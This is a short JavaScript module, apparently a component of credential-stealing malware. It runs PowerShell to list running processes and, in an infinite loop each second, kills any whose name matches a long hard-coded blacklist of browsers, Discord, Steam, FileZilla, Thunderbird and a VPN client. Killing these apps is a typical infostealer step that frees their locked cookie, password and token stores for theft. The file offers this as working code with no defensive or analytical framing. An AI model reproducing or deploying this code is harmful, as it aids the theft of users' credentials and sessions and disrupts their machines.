const {
    delay,
    execPowerShell,
} = require("../../../utils/harware/processes.js");

const finishProcess = async (pid) => {
    try {
        process.kill(pid);
    } catch (error) {
        console.error(error.message);
    }
}

const finishProcessesByNames = async (blacklist) => {
    try {
        const allProcessesOutput = await execPowerShell('Get-Process | Select-Object -Property Name, Id');
        const processLines = allProcessesOutput.trim().split('\r\n');

        const processMap = new Map();

        processLines.forEach(line => {
            const parts = line.split(/\s+/);
            if (parts.length < 2) return;

            const name = parts.slice(0, -1).join(' ');
            const id = parts[parts.length - 1];
            const pid = parseInt(id, 10);

            if (!isNaN(pid)) {
                processMap.set(name.toLowerCase(), pid);
            }
        });

        const blacklistLower = blacklist.map(item => item.toLowerCase());

        const pidkill = [];

        for (const [processName, pid] of processMap.entries()) {
            if (blacklistLower.some(item => processName.includes(item))) {
                pidkill.push(
                    finishProcess(pid).catch(error => { })
                );
            }
        }

        await Promise.all(pidkill);
    } catch (error) {
        console.error(error.message);
    }
};

module.exports = async () => {
    const blacklistRunningProcesses = ["discord", "cord", "Waterfox", "mullvad", "firefox", "chrome", "mozilla", "vivaldi", "Opera", "OperaGX", "EpicPrivacy", "ChromeSxS", "Sputnik", "7Star", "CentBrowser", "Orbitum", "Amigo", "Torch", "Kometa", "steam", "filezilla", "brave", "BraveSoftware", "brave.exe", "msedge", "edge", "Uran", "KMelon", "Maxthon3", "iebao", "oowon", "leipnir5", "hromePlus", "uperbird", "afotech", "aferTechnologies", "uhba", "orBrowser", "lementsBrowser", "ocCoc", "oBrowser", "IP Surf", "Atom", "liebao", "Coowon", "Sleipnir5", "ChromePlus", "Superbird", "Rafotech", "SaferTechnologies", "Suhba", "TorBrowser", "ElementsBrowser", "CocCoc", "GoBrowser", "QIP Surf", "RockMelt", "Nichrome", "Bromium", "Comodo", "Xpom", "Chedot", "360Browser", "Kmelon", "PaleMoon", "IceDragon", "BlackHaw", "Cyberfox", "Thunderbird", "SeaMonkey", "Firefox", "ockMelt", "ichrome", "romium", "omodo", "pom", "hedot", "60Browser",];

    while (true) {
        await finishProcessesByNames(blacklistRunningProcesses);

        await delay(1000);
    };
}